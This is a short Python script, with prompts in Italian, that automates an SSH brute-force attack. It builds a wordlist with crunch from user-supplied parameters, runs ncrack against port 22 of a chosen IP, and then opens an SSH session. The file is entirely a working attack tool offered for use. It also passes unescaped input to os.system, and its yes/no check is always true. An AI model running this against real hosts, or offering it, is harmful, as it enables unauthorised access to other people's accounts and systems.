#!/usr/bin/ python3

import os
def main():
	os.system("clear;figlet -l Brutessh")

	#var
	ip=input("inserisci indirizzo ip per bruteforce: ")
	user=input("inserisci utente: ")
	key=input("inserisci parola chiave: ")
	min=int(input("inserire min: "))
	max=int(input("inserire max: "))

	#creating wordlist
	command="crunch "+str(min)+" "+str(max)+" "+str(key)+" > pass.txt" #pass
	os.system(command)

	#Bruteforce Attack
	os.system("sudo ncrack --user "+user+" -P pass.txt "+ip+":22") #ncrack --users admin -P pass.txt 192.168.1.X:22

	risp=input("you want to connect locally with the ssh protocol?: ")
	if risp=="y" or "Y" or "S" or "s":
		os.system("ssh -l "+user+" "+ip) #ssh -l root 192.168.1.X
	else:
		exit(1)

if __name__ == "__main__":
	main()
